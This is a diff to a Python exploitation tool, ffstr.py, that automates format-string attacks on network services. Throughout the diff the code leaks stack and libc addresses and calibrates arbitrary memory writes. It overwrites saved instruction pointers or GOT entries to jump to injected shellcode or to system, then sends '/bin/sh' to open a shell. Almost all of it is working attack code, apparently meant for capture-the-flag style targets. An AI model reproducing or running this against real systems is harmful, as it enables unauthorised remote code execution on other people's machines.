@@ -48,7 +48,7 @@ class ffstr():
 		self.calibration = None
 		
 		# Format string delimiters
-		self.delimiters = [b"   d34d|",b"|b33f   "]
+		self.delimiters = [b"---d34d|",b"|b33f---"]
 		
 		# Regular Expression Pattern
 		self.re_HexaPattern 	= b'(0[xX][0-9a-fA-F]+)|(\(n.l?\))'
@@ -283,6 +283,10 @@ class ffstr():
 	def stackDump(self,nb_elt=100):
 		# Dump the stack, maximum of nb_elt element
 		
+		# Lazy mode
+		if self.stack_arg is not None:
+			return
+		
 		print("Dumping stack ...")
 		
 		# Store the stack
@@ -346,7 +350,11 @@ class ffstr():
 			return int("0x0",16).to_bytes(self.block_byte,order)
 			
 	def stackAnalyze(self):
-		
+	
+		# Lazy mode
+		if self.stack_arg is not None:
+			return
+			
 		## Stage 0 - Get a copy of self.stack
 		_stack = []
 		_stack.extend(self.stack)
@@ -437,7 +445,22 @@ class ffstr():
 		# return finding
 		return data
 		
-		
+	def readStack(self,pl):
+		# read data from stack
+		regex = None
+		while regex is None:
+			data = self.asyncExchange(pl) 
+			regex = re.search(self.re_HexaPattern, data)
+			if regex:
+				return regex[0]
+				
+	def readUntilDelim(self,pl):
+		# Read until delimiters
+		data = b""
+		while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
+			data = self.asyncExchange(pl)
+		return data
+			
 	def readAnywhere(self,addr,minsize=8,leftpad="",rightpad=""):	
 		# Format String Read Anywhere payload
 		
@@ -452,8 +475,23 @@ class ffstr():
 			pl = self.stackPayload(pos_arg,b"s",size=8,left=leftpad,right=rightpad)+p64(addr)
 		
 		return pl
+	
+	def writeAnywhere(self,write,nbw=0,shellcode=b""):
+		# Format String write anywhere ex : 
+		# write={addr:0x41414141}
+		# nbw number of characters already printed
 		
-	def stackGPS(self,n=100):
+		# Prepare the payload
+		pl = self.delimiters[0]+fmtstr_payload(self.stack_arg, write, numbwritten=nbw+len(self.delimiters[0]),write_size="short")+shellcode
+					
+		# Send fake data until it is the time to send the payload
+		while not self.blind_behavior[self.behavior %  len(self.blind_behavior)]:
+			self.asyncExchange(pl)
+	
+		# Send the payload	
+		return self.asyncExchange(pl)
+		
+	def stackGPS(self,n=100,nbstack=32):
 	
 		# Lazy mode
 		if self.addr is not None:
@@ -462,8 +500,8 @@ class ffstr():
 		# find stack address and relate to the format string injection address
 		print("Stack localisation ...")
 		
-		# Use previous acquired stack values for offset bruteforcing
-		for i in range(len(self.stack)):
+		# Select a stack argument
+		for i in range(nbstack):
 		
 			# check n adress below
 			for k in range(n): 
@@ -471,45 +509,28 @@ class ffstr():
 				# in both direction d
 				for d in [-1]:
 				
-					# Leak an hexadecimal value
-					leak = None
-					while leak is None:
-						data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-						regex = re.search(self.re_HexaPattern, data)
-
-						if regex:
-							try:
-								leak = int(regex[0],16)
-							except:
-								self.close()
-								break
-						else: 
-							self.close()
-							break
-							
-					# failsafe for leak
-					if leak is None:
-						continue
-					
-					# in case of negative value
-					if leak+d*self.block_byte*k <= 0:
-						self.close()
-						continue
-					
-					# Read anywhere format string
 					try:
+						# Leak stack adress from stack	
+						pl = self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])
+						regex = self.readStack(pl)
+						leak = int(regex,16)
+						
+						# If we calculate a negative value, then we havent leak the value of rbp
+						if leak+d*self.block_byte*k <= 0:
+							self.close()
+							continue
+					
+						# Read anywhere format string
 						pl = self.readAnywhere(leak +d*self.block_byte*k,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+						data = self.readUntilDelim(pl)
+						
 					except:
 						continue
 					
-					# Get Data
-					data = b""
-					while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-						data = self.asyncExchange(pl)
-					
+					# Showing something to the user
 					print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35],end="\r")
 					
-					
+					# In case, twice the delimiters if found
 					if data.find(self.delimiters[0]*2)>-1:
 						print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])
 						print("Found at argument ",i+1," offset ", d*self.block_byte*k)
@@ -518,8 +539,8 @@ class ffstr():
 						self.set_future_args("STACKADR="+str(i+1)+":"+str(d*self.block_byte*k))
 						return
 					
-					# Leak 0x7ffce61c00c8  17   -1   b'\nHello there, \n   d34d|%9$s|b33f
-					# Leak 0x7ffc47e93e18  17   -1   b'\nHello there, \n   d34d|%9$s|b33f   '
+					# If one set of delimiters is found, correct with length of delimiters
+					"""
 					if re.findall(self.re_ArgPattern, data):
 						print("Leak "+hex(leak+d*self.block_byte*k)+" ",str(i)," ",str(d)," ",data[:35])
 						print("*Found at argument ",i+1," offset ", d*self.block_byte*k-len(self.delimiters[0]))
@@ -527,6 +548,7 @@ class ffstr():
 						self.addr=(i+1,d*self.block_byte*k-len(self.delimiters[0]))
 						self.set_future_args("STACKADR="+str(i+1)+":"+str(d*self.block_byte*k-len(self.delimiters[0])))
 						return
+					"""
 					
 	def calibrateStackWrite(self,n=100): # check for 64 bits
 	
@@ -548,47 +570,34 @@ class ffstr():
 				# Closing connection
 				self.close()
 				
-				# Leak an hexadecimal value
-				leak = None
-				
-				data = self.asyncExchange(self.stackPayload(stackrbp,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-				regex = re.search(self.re_HexaPattern, data)
-				if regex:
-					try:
-						leak = int(regex[0],16)
-					except:
-						self.close()
-						break
-				
+				# Leak stack adress from stack	
+				try:
+					pl = self.stackPayload(stackrbp,b"p",left=self.delimiters[0],right=self.delimiters[1])
+					regex = self.readStack(pl)
+					leak = int(regex,16)
+				except:
+					continue
+					
 				# write format string
 				if self.bits == 32:
 					write={leak+k*self.block_byte:0x41414141}
-					pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw,write_size="short")
+					self.writeAnywhere(write,nbw)
 				else:
 					write={leak+k*self.block_byte:0x4141414141414141}
-					pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw,write_size="short")
+					self.writeAnywhere(write,nbw)
 					
-				# Get Data
-				data = b""
-				data = self.asyncExchange(pl)
-				
+				# Show something to the user
 				print(".",end="")
 				
 				# Read and check if calibrated
-				_leak = None
-				while _leak is None:
-					data = self.asyncExchange(self.readAnywhere(leak+k*self.block_byte,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])) 
-					regex = re.search(self.re_HexaPattern, data)
-					try:
-						_leak = regex[0]
-					except:
-						self.close()
-						break
+				pl = self.readAnywhere(leak+k*self.block_byte,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+				data = self.readUntilDelim(pl)
 				
+				# Checking victory
 				if data.find(b"AAAA")>-1:
-					print("Writing calibration found : "+str(nbw+1-8))
-					self.set_future_args("CALIB="+str(nbw+1-8))
-					self.calibration = nbw+1-8
+					print("Writing calibration found : "+str(nbw)) #1-8
+					self.set_future_args("CALIB="+str(nbw)) #1-8
+					self.calibration = nbw#+1-8
 					return
 				
 	def checkshell(self):
@@ -626,23 +635,27 @@ class ffstr():
 				pos = -offset // self.block_byte + self.stack_arg - len(self.delimiters[0]) // self.block_byte
 				
 				# Leak an hexadecimal value // stack address
-				data = self.asyncExchange(self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
-				regex = re.search(self.re_HexaPattern, data)
-				stack = int(regex[0],16)
-				
+				try:
+					pl = self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])
+					regex = self.readStack(pl)
+					stack = int(regex,16)
+				except:
+					continue
+					
 				# Leak an hexadecimal value // rip
-				data = self.asyncExchange(self.stackPayload(pos+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
-				regex = re.search(self.re_HexaPattern, data)
-				rip = int(regex[0],16)
-
+				try:
+					pl = self.stackPayload(pos+1,b"p",left=self.delimiters[0],right=self.delimiters[1])
+					regex = self.readStack(pl)
+					rip = int(regex,16)
+				except:
+					continue
+					
+				# Show something to the user
 				print("Read stack @ ",hex(stack)," Old Instruction Pointer ",hex(rip)," New Instruction Pointer ",hex(rip+d*i),end="\r")
 				
 				# write format string
 				write={stack+self.block_byte:rip+d*i}
-				pl = self.delimiters[0]+fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
-
-				# Get Data
-				data = self.asyncExchange(pl)
+				data = self.writeAnywhere(write,self.calibration)
 				
 				# Checking Flag
 				self.checkflag(data)
@@ -677,16 +690,18 @@ class ffstr():
 			pos = - offset // self.block_byte + self.stack_arg - len(self.delimiters[0]) // self.block_byte 
 						
 			# Leak an hexadecimal value // stack address
-			data = self.asyncExchange(self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])) 
-			regex = re.search(self.re_HexaPattern, data)
-			stack = int(regex[0],16)
-
+			try:
+				pl = self.stackPayload(pos,b"p",left=self.delimiters[0],right=self.delimiters[1])
+				regex = self.readStack(pl)
+				stack = int(regex,16)
+			except:
+				continue
+					
 			# write format string, bruteforce shellcode begining
 			write={stack+self.block_byte:stack-k*4}
 
 			# Write Instruction Pointer for returning to injected shellcode
-			pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")+shellcode
-			data = self.asyncExchange(pl)
+			data = self.writeAnywhere(write,self.calibration,shellcode)
 			
 			# inform user
 			print("Searching shellcode at : "+str(k*4),end="\r")
@@ -722,31 +737,23 @@ class ffstr():
 			for guess in guessed:
 				
 				# Leak an hexadecimal value
-				leak = None
-				while leak is None:
-					data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-					regex = re.search(self.re_HexaPattern, data)
-					if regex:
-						try:
-							leak = int(regex[0],16)
-						except:
-							self.close()
-							break
-						
+				try:
+					pl = self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])
+					regex = self.readStack(pl)
+					leak = int(regex,16)
+				except:
+					continue
+				
+				# Show something to the user
 				print("Leak "+hex(leak)+" ... Offset "+hex(guess),end="\r")
 				
-				# Read anywhere format string
-				pl = self.readAnywhere(leak - guess,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
-
 				# in case of negative value
 				if leak-guess <= 0:
 					continue
 					
-				# Get Data
-				data = b""
-				while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-					data += self.asyncExchange(pl)
-
+				# Read anywhere format string
+				pl = self.readAnywhere(leak - guess,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+				data = self.readUntilDelim(pl)
 				
 				# ELF Header
 				if data.find(b"\x7fELF") > -1:
@@ -772,21 +779,26 @@ class ffstr():
 		# Gathering information
 		info = []
 		for _ in range(2):
+			
+			# Closing the connection
+			self.close()
 					
 			# Get location
 			i , offset = self.start
 			
 			# Leak an hexadecimal value
-			leak = None
-			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-				regex = re.search(self.re_HexaPattern, data)
-				if regex:
-					leak = hex(int(regex[0],16)-offset)
+			try:
+				pl = self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])
+				regex = self.readStack(pl)
+				leak = hex(int(regex,16)-offset)
+			except:
+				continue
 					
 			# info gathering
 			info.append(leak)
+			
 		
+		# if no PIE, the value is the same
 		if info[0] == info[1]:
 			self.set_future_args("PIE="+info[0])
 
@@ -827,13 +839,13 @@ class ffstr():
 			i , offset = self.start
 			
 			# Leak an hexadecimal value
-			leak = None
-			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-				regex = re.search(self.re_HexaPattern, data)
-				if regex:
-					leak = int(regex[0],16)
-						
+			try:
+				pl = self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])
+				regex = self.readStack(pl)
+				leak = int(regex,16)
+			except:
+				continue
+					
 			# Read anywhere format string
 			pl = self.readAnywhere(leak - offset + n,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
 			
@@ -844,10 +856,7 @@ class ffstr():
 				continue
 				
 			# Get Data
-			data = b""
-			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-				data += self.asyncExchange(pl)
-
+			data = self.readUntilDelim(pl)
 
 			left = data.find(self.delimiters[0])+len(self.delimiters[0])
 			right= data.find(self.delimiters[1])
@@ -887,16 +896,25 @@ class ffstr():
 	def showSymbols(self):
 		# Read binary symbols
 		
+		
 		# Working on a stack copy
 		if self.elf is None:
 			print("No ELF as support ...")
 			return
 		
+		# Choice
+		print("Show symbols ?")
+		if not self.yesno():
+			return
+			
 		# Say hello
 		print("Show symbols ...")
 		
 		# read each symbols
 		for sym in self.elf.symbols.keys():
+			
+			# Clossing
+			self.close()
 			
 			# Get location
 			i , offset = self.start
@@ -905,19 +923,23 @@ class ffstr():
 			addr = self.elf.symbols[sym]
 			
 			# Leak an hexadecimal value
-			leak = None
-			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-				regex = re.search(self.re_HexaPattern, data)
-				if regex:
-					leak = int(regex[0],16)
-					
+			try:
+				pl = self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])
+				regex = self.readStack(pl)
+				leak = int(regex,16)
+			except:
+				continue
+				
 			print("Leak "+hex(leak)+" ... Offset "+hex(offset)+" "+sym+" "+hex(addr),end="\r")
 					
 			# address correction if no PIE
 			if not self.elf.pie:
 				addr -= leak-offset
 				
+			# if negative value continue
+			if leak - offset + addr < 0:
+				continue
+			
 			# Read anywhere format string
 			pl = self.readAnywhere(leak - offset + addr,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
 			
@@ -926,11 +948,7 @@ class ffstr():
 				continue
 				
 			# Get Data
-			data = b""
-			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-				data = self.asyncExchange(pl)
-
-
+			data = self.readUntilDelim(pl)
 			left = data.find(self.delimiters[0])+len(self.delimiters[0])
 			right= data.find(self.delimiters[1])
 			
@@ -974,28 +992,26 @@ class ffstr():
 		# If PIE
 		if self.pie is None:
 			# Leak an hexadecimal value
-			leak = None
-			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-				regex = re.search(self.re_HexaPattern, data)
-				if regex:
-					leak = int(regex[0],16) - offset
+			try:
+				pl = self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])
+				regex = self.readStack(pl)
+				leak = int(regex,16) - offset
+			except:
+				return
 		else:
 			leak = self.pie
-				
+			
 		# Find puts (more stable than printf)
 		plt_got = self.elf.symbols["got.puts"]
 
 		# Read anywhere format string
 		pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+		data = self.readUntilDelim(pl)
 			
-		# Get libc puts leak
-		data = self.asyncExchange(pl)
-
 		# Extract leak
 		left = data.find(self.delimiters[0])+len(self.delimiters[0])
 		right= data.find(self.delimiters[1])
-		dump =data[left:right][:self.block_byte]
+		dump = data[left:right][:self.block_byte]
 		
 		# Calculation libc base from puts leak
 		base =  int("0x"+dump[::-1].hex(),16) - libc.symbols["puts"]
@@ -1009,10 +1025,7 @@ class ffstr():
 		
 		# Write What Where
 		write={printf:sys}
-		
-		# Write Instruction Pointer for returning to injected shellcode
-		pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
-		data = self.asyncExchange(pl)
+		data = self.writeAnywhere(write,self.calibration)
 		
 		# Ask for /bin/sh
 		self.asyncExchange(b"/bin/sh")
@@ -1028,12 +1041,8 @@ class ffstr():
 		
 		# if we have access to the elf
 		if "ELF" in args.keys():
-			dumped = args["ELF"]
-			
-		# unless scavenger way
-		else:
-			dumped = self.dump_name
-			
+			self.dump_name = args["ELF"]
+
 		# Dump opening
 		with open(self.dump_name,"rb") as fp:
 			data = fp.read()
@@ -1044,6 +1053,7 @@ class ffstr():
 		# Got address 
 		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
 			
+		# Rough string extraction
 		print(strings)
 		print("\nPlease do your best to identify the Libc, and use LIBC=your_libc_here.so\n")
 		
@@ -1054,34 +1064,29 @@ class ffstr():
 			i , offset = self.start
 			
 			# Leak an hexadecimal value
-			leak = None
-			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-				regex = re.search(self.re_HexaPattern, data)
-				if regex:
-					leak = int(regex[0],16)
-				
+			try:
+				pl = self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])
+				regex = self.readStack(pl)
+				leak = int(regex,16) 
+			except:
+				return
+					
 			# relocate 		
 			plt_got = int(plt[2:-1][::-1].hex(),16)
 			if plt_got < leak-offset:
-				plt_got += leak-offset+rip+6 # check why
-
+				plt_got += leak - offset + rip + 6 # +6 if for the next instruction pointer calculation
 			
 			# Read anywhere format string
 			pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
-
-			
-			# Get Data
-			data = b""
-			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
-				data += self.asyncExchange(pl)
+			data = self.readUntilDelim(pl)
 
 			left = data.find(self.delimiters[0])+len(self.delimiters[0])
 			right= data.find(self.delimiters[1])
 			dump =data[left:right]
-			print(">> ",hex(plt_got),dump[::-1].hex())
+			print(">> ", hex(plt_got), dump[::-1].hex()[-2*self.block_byte:])
 		print("\n")
 			
+	
 	def hijackGOT(self):
 	
 		# Lazy mode, don't redo things
@@ -1098,10 +1103,7 @@ class ffstr():
 		
 		# if we have access to the elf
 		if "ELF" in args.keys():
-			dumped = args["ELF"]
-		# unless scavenger way
-		else:
-			dumped = self.dump_name
+			self.dump_name = args["ELF"]
 			
 		# Dump opening
 		with open(self.dump_name,"rb") as fp:
@@ -1114,10 +1116,8 @@ class ffstr():
 		got = [ (elt,data.find(elt)) for elt in re.findall(b"\xff\x25....\x68", data)]
 			
 		# puts
-		#plt,rip = got[0]
 		func = input("Which function to use for libc relocation (puts) ? ").strip()
 		entry = int(input("To which entry it correspod (0-N) ? :"))
-		
 		
 		plt,rip = got[entry]
 		
@@ -1132,12 +1132,12 @@ class ffstr():
 		# If PIE
 		if self.pie is None:
 			# Leak an hexadecimal value
-			leak = None
-			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
-				regex = re.search(self.re_HexaPattern, data)
-				if regex:
-					leak = int(regex[0],16) - offset
+			try:
+				pl = self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])
+				regex = self.readStack(pl)
+				leak = int(regex,16) - offset
+			except:
+				return
 		else:
 			leak = self.pie
 
@@ -1148,10 +1148,8 @@ class ffstr():
 			
 		# Read anywhere format string
 		pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
-			
-		# Get libc puts leak
-		data = self.asyncExchange(pl)
-
+		data = self.readUntilDelim(pl)
+		
 		# Extract leak
 		left = data.find(self.delimiters[0])+len(self.delimiters[0])
 		right= data.find(self.delimiters[1])
@@ -1173,8 +1171,7 @@ class ffstr():
 		write={plt_got+(_entry-entry)*self.block_byte:sys}
 		
 		# Write Instruction Pointer for returning to injected shellcode
-		pl = self.delimiters[0] + fmtstr_payload(self.stack_arg, write, numbwritten=self.calibration+7,write_size="short")
-		data = self.asyncExchange(pl)
+		data = self.writeAnywhere(write,self.calibration)
 		
 		# Ask for /bin/sh
 		self.asyncExchange(b"/bin/sh")
@@ -1187,7 +1184,6 @@ class ffstr():
 def help():
 	print(
 	"""
-	!!! WARNING BETA VERSION !!!
 	
 	Usage python3 ffstr.py options
 	
@@ -1216,7 +1212,7 @@ if __name__ == "__main__":
 	exploit = ffstr()
 	exploit.getArgs()
 	exploit.mentalist(nb_input=10)
-	exploit.stackDump(nb_elt=200)
+	exploit.stackDump(nb_elt=100)
 	exploit.stackAnalyze()
 	exploit.stackGPS()
 	exploit.calibrateStackWrite()
